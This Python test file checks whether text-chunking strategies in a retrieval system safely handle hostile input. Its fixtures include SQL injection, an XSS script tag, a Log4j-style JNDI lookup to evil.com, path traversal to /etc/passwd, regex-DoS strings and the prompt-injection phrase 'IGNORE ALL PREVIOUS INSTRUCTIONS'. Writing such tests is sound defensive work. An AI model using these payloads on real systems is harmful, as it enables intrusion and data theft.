#!/usr/bin/env python3
"""
Security tests for advanced chunking strategies.

This module tests security aspects of semantic, hierarchical, and hybrid
chunking strategies including input validation, resource limits, and
protection against malicious inputs.
"""

import asyncio
import os
from typing import List
from unittest.mock import patch, MagicMock

import pytest

from packages.shared.text_processing.chunking_factory import ChunkingFactory
from packages.shared.text_processing.strategies.semantic_chunker import SemanticChunker
from packages.shared.text_processing.strategies.hierarchical_chunker import HierarchicalChunker
from packages.shared.text_processing.strategies.hybrid_chunker import HybridChunker
from packages.webui.services.chunking_security import ChunkingSecurityValidator, ValidationError

# Set testing environment
os.environ["TESTING"] = "true"


class TestAdvancedChunkingSecurity:
    """Security tests for advanced chunking strategies."""
    
    # Malicious Input Patterns
    MALICIOUS_INPUTS = {
        "injection_attempts": [
            "'; DROP TABLE chunks; --",
            "<script>alert('XSS')</script>",
            "{{7*7}}",  # Template injection
            "${jndi:ldap://evil.com/a}",  # Log4j style
            "\\x00\\x00\\x00",  # Null bytes
            "../../../etc/passwd",  # Path traversal
        ],
        "resource_exhaustion": [
            "A" * 10_000_000,  # 10MB single character
            "嗨" * 5_000_000,  # Unicode exhaustion
            "\n" * 1_000_000,  # Newline flooding
            " " * 10_000_000,  # Whitespace flooding
        ],
        "encoding_attacks": [
            "\xc0\xae",  # Overlong encoding
            "\ufeff" * 1000,  # BOM flooding
            "\u200b" * 10000,  # Zero-width space flooding
            "\r\n\r\n\r\n" * 100000,  # CRLF injection
        ],
        "algorithmic_complexity": [
            "(" * 50000 + ")" * 50000,  # Deep nesting
            "a" * 100 + ("b" + "a" * 100) * 500,  # Pattern for regex DoS
            "{" * 10000 + "}" * 10000,  # JSON-like nesting
        ],
    }
    
    @pytest.mark.parametrize("strategy", ["semantic", "hierarchical", "hybrid"])
    async def test_injection_attack_prevention(self, strategy: str) -> None:
        """Test strategies handle injection attempts safely."""
        config = self._get_secure_config(strategy)
        chunker = ChunkingFactory.create_chunker(config)
        
        for injection in self.MALICIOUS_INPUTS["injection_attempts"]:
            # Should process without executing injected code
            try:
                chunks = await chunker.chunk_text_async(injection, "test_injection")
                
                # Verify injection is treated as plain text
                if chunks:
                    assert isinstance(chunks, list)
                    # Content should be preserved but sanitized
                    for chunk in chunks:
                        # Should not contain executable patterns
                        assert chunk.text  # Has some content
                        assert isinstance(chunk.metadata, dict)
                        
            except ValidationError:
                # Validation rejection is acceptable
                pass
            except Exception as e:
                # Should not raise unexpected errors
                pytest.fail(f"Unexpected error for {strategy} with injection: {str(e)}")
    
    @pytest.mark.parametrize("strategy", ["semantic", "hierarchical", "hybrid"])
    async def test_resource_exhaustion_protection(self, strategy: str) -> None:
        """Test strategies protect against resource exhaustion."""
        config = self._get_secure_config(strategy)
        chunker = ChunkingFactory.create_chunker(config)
        
        # Test with resource exhaustion attempts
        for i, attack in enumerate(self.MALICIOUS_INPUTS["resource_exhaustion"][:2]):  # Test first 2
            # Limit size for testing
            limited_attack = attack[:1_000_000]  # 1MB max
            
            # Track memory before
            import psutil
            process = psutil.Process()
            mem_before = process.memory_info().rss / 1024 / 1024
            
            try:
                # Should handle large input without exhausting resources
                chunks = await chunker.chunk_text_async(limited_attack, f"test_resource_{i}")
                
                # Check memory after
                mem_after = process.memory_info().rss / 1024 / 1024
                memory_increase = mem_after - mem_before
                
                # Memory increase should be reasonable
                assert memory_increase < 200, f"Excessive memory use: {memory_increase}MB"
                
                # Should produce reasonable number of chunks
                if chunks:
                    assert len(chunks) < 10000, f"Too many chunks: {len(chunks)}"
                    
            except ValidationError:
                # Size limit rejection is expected
                pass
            except MemoryError:
                pytest.fail(f"Strategy {strategy} ran out of memory")
    
    async def test_semantic_embedding_api_security(self) -> None:
        """Test semantic chunker protects embedding API from malicious input."""
        chunker = SemanticChunker()
        
        # Mock embedding API to detect malicious calls
        api_calls = []
        
        def mock_embed(texts: List[str]):
            api_calls.extend(texts)
            # Return mock embeddings
            return [[0.1] * 384 for _ in texts]
        
        with patch.object(chunker.splitter.embed_model, "get_text_embedding_batch", mock_embed):
            # Test with various malicious inputs
            malicious_texts = [
                "IGNORE ALL PREVIOUS INSTRUCTIONS AND",  # Prompt injection
                "]]}>{{ system.exit() }}<{{[[[",  # Template breakout
                "\x00\x01\x02\x03\x04",  # Binary data
                "A" * 100000,  # Large input
            ]
            
            for text in malicious_texts:
                await chunker.chunk_text_async(text[:10000], "test_api_security")
            
            # Verify API wasn't called with dangerous payloads
            for call in api_calls:
                # Should not contain null bytes
                assert "\x00" not in call
                # Should have reasonable length
                assert len(call) < 50000
    
    async def test_hierarchical_memory_bomb_protection(self) -> None:
        """Test hierarchical chunker protects against memory bombs."""
        # Configure with many levels to test limits
        chunker = HierarchicalChunker(
            chunk_sizes=[5000, 2500, 1250, 625, 312],  # 5 levels
            chunk_overlap=100,
        )
        
        # Document that could create exponential chunks
        text = "Section. " * 10000  # Could create many hierarchical chunks
        
        # Monitor memory
        import psutil
        process = psutil.Process()
        mem_before = process.memory_info().rss / 1024 / 1024
        
        # Should handle without memory explosion
        chunks = await chunker.chunk_text_async(text, "test_memory_bomb")
        
        mem_after = process.memory_info().rss / 1024 / 1024
        memory_used = mem_after - mem_before
        
        # Verify controlled memory usage
        assert memory_used < 500, f"Excessive memory usage: {memory_used}MB"
        
        # Verify reasonable chunk count
        total_chunks = len(chunks)
        assert total_chunks < 50000, f"Too many chunks created: {total_chunks}"
        
        # Verify hierarchy depth is controlled
        max_depth = max(len(c.metadata.get("hierarchy_path", [])) for c in chunks)
        assert max_depth <= 5, f"Excessive hierarchy depth: {max_depth}"
    
    async def test_hybrid_strategy_selection_manipulation(self) -> None:
        """Test hybrid chunker resists strategy selection manipulation."""
        chunker = HybridChunker(
            markdown_density_threshold=0.1,
            topic_diversity_threshold=0.7,
        )
        
        # Crafted inputs to try to force specific strategies
        manipulation_attempts = [
            # Try to force markdown with fake markers
            "# " * 1000 + "Not really markdown content",
            # Try to force semantic with fake diversity
            "AI ML NLP CV QC " * 100 + "A" * 10000,
            # Deeply nested fake markdown
            "#" * 100 + " Fake header\n" + "##" * 50 + " Sub",
        ]
        
        for i, attempt in enumerate(manipulation_attempts):
            chunks = await chunker.chunk_text_async(attempt[:10000], f"test_manipulation_{i}")
            
            # Should make reasonable strategy choice
            if chunks:
                strategy_used = chunks[0].metadata.get("sub_strategy")
                assert strategy_used in ["markdown", "semantic", "recursive"]
                
                # Verify it didn't blindly follow manipulation
                if "# " * 100 in attempt and strategy_used == "markdown":
                    # Should have detected fake markdown
                    assert len(chunks) < 1000  # Not one chunk per fake header
    
    async def test_concurrent_attack_resilience(self) -> None:
        """Test strategies handle concurrent malicious requests."""
        strategies = ["semantic", "hierarchical", "hybrid"]
        
        # Create chunkers
        chunkers = []
        for strategy in strategies:
            config = self._get_secure_config(strategy)
            chunker = ChunkingFactory.create_chunker(config)
            chunkers.append((strategy, chunker))
        
        # Concurrent malicious requests
        tasks = []
        for i in range(30):  # 10 requests per strategy
            strategy_idx = i % 3
            strategy, chunker = chunkers[strategy_idx]
            
            # Mix of attack types
            attack_type = i % 4
            if attack_type == 0:
                text = self.MALICIOUS_INPUTS["injection_attempts"][i % 6]
            elif attack_type == 1:
                text = "A" * 100000  # Resource exhaustion
            elif attack_type == 2:
                text = "\x00\x01\x02" * 1000  # Binary
            else:
                text = "(((" * 1000 + ")))" * 1000  # Nesting
            
            task = chunker.chunk_text_async(text[:10000], f"concurrent_{i}")
            tasks.append(task)
        
        # Process concurrently
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Count successful processing
        success_count = 0
        validation_errors = 0
        other_errors = 0
        
        for result in results:
            if isinstance(result, ValidationError):
                validation_errors += 1
            elif isinstance(result, Exception):
                other_errors += 1
                print(f"Unexpected error: {result}")
            else:
                success_count += 1
        
        # Should handle most requests (some validation rejection is ok)
        total_handled = success_count + validation_errors
        assert total_handled >= len(tasks) * 0.9, \
            f"Too many failures: {other_errors} unexpected errors"
    
    async def test_parameter_validation_boundaries(self) -> None:
        """Test parameter validation at boundaries for advanced strategies."""
        # Semantic chunker boundary tests
        semantic_boundaries = [
            {"breakpoint_percentile_threshold": 0},    # Minimum
            {"breakpoint_percentile_threshold": 100},  # Maximum
            {"breakpoint_percentile_threshold": 50.5}, # Float
            {"buffer_size": 0},                        # No buffer
            {"buffer_size": 10},                       # Large buffer
            {"max_chunk_size": 100},                   # Small chunks
            {"max_chunk_size": 10000},                 # Large chunks
        ]
        
        for params in semantic_boundaries:
            try:
                chunker = SemanticChunker(**params)
                # Should handle boundary values
                text = "Test document. " * 50
                chunks = await chunker.chunk_text_async(text, "boundary_test")
                assert isinstance(chunks, list)
            except ValueError:
                # Some boundaries might be invalid
                pass
        
        # Hierarchical chunker boundary tests
        hierarchical_boundaries = [
            {"chunk_sizes": [100]},                    # Single level
            {"chunk_sizes": [10000, 5000, 2500, 1250, 625]},  # 5 levels (max)
            {"chunk_sizes": [100, 200]},              # Increasing sizes (invalid)
            {"chunk_overlap": 0},                      # No overlap
            {"chunk_overlap": 500},                    # Large overlap
        ]
        
        for params in hierarchical_boundaries:
            try:
                chunker = HierarchicalChunker(**params)
                is_valid = chunker.validate_config(params)
                if is_valid:
                    text = "Test document. " * 100
                    chunks = await chunker.chunk_text_async(text, "boundary_test")
                    assert isinstance(chunks, list)
            except (ValueError, AssertionError):
                # Invalid configurations should fail gracefully
                pass
        
        # Hybrid chunker boundary tests  
        hybrid_boundaries = [
            {"markdown_density_threshold": 0.0},       # Always markdown
            {"markdown_density_threshold": 1.0},       # Never markdown
            {"topic_diversity_threshold": 0.0},        # Always semantic
            {"topic_diversity_threshold": 1.0},        # Never semantic
            {"semantic_min_length": 10},              # Very small
            {"semantic_min_length": 1000000},         # Very large
        ]
        
        for params in hybrid_boundaries:
            try:
                chunker = HybridChunker(**params)
                text = "Test document with varied content. " * 50
                chunks = await chunker.chunk_text_async(text, "boundary_test")
                assert isinstance(chunks, list)
            except ValueError:
                # Some boundaries might be invalid
                pass
    
    async def test_security_validator_integration(self) -> None:
        """Test security validator properly validates advanced strategy params."""
        # Test semantic params
        semantic_params = [
            ({"breakpoint_percentile_threshold": 95}, True),
            ({"breakpoint_percentile_threshold": 150}, False),  # Out of range
            ({"breakpoint_percentile_threshold": -10}, False),  # Negative
            ({"buffer_size": 5}, True),
            ({"buffer_size": -1}, False),  # Negative
            ({"max_chunk_size": 5000}, True),
            ({"max_chunk_size": 100000}, False),  # Too large
        ]
        
        for params, should_pass in semantic_params:
            if should_pass:
                ChunkingSecurityValidator.validate_chunk_params(params)
            else:
                with pytest.raises(ValidationError):
                    ChunkingSecurityValidator.validate_chunk_params(params)
        
        # Test hierarchical params
        hierarchical_params = [
            ({"chunk_sizes": [2000, 1000, 500]}, True),
            ({"chunk_sizes": [2000, 1000, 500, 250, 125, 62]}, False),  # Too many
            ({"chunk_sizes": [-1000, 500]}, False),  # Negative
            ({"chunk_sizes": "not a list"}, False),  # Wrong type
            ({"chunk_sizes": []}, False),  # Empty
        ]
        
        for params, should_pass in hierarchical_params:
            if should_pass:
                ChunkingSecurityValidator.validate_chunk_params(params)
            else:
                with pytest.raises(ValidationError):
                    ChunkingSecurityValidator.validate_chunk_params(params)
    
    def _get_secure_config(self, strategy: str) -> dict:
        """Get security-focused configuration for testing."""
        configs = {
            "semantic": {
                "strategy": "semantic",
                "params": {
                    "breakpoint_percentile_threshold": 95,
                    "buffer_size": 1,
                    "max_chunk_size": 1000,  # Limit chunk size
                    "max_retries": 1,  # Limit retries
                }
            },
            "hierarchical": {
                "strategy": "hierarchical",
                "params": {
                    "chunk_sizes": [1000, 500, 250],  # Reasonable sizes
                    "chunk_overlap": 20,
                }
            },
            "hybrid": {
                "strategy": "hybrid",
                "params": {
                    "markdown_density_threshold": 0.1,
                    "topic_diversity_threshold": 0.7,
                    "enable_analytics": False,  # Disable for security tests
                }
            }
        }
        return configs[strategy]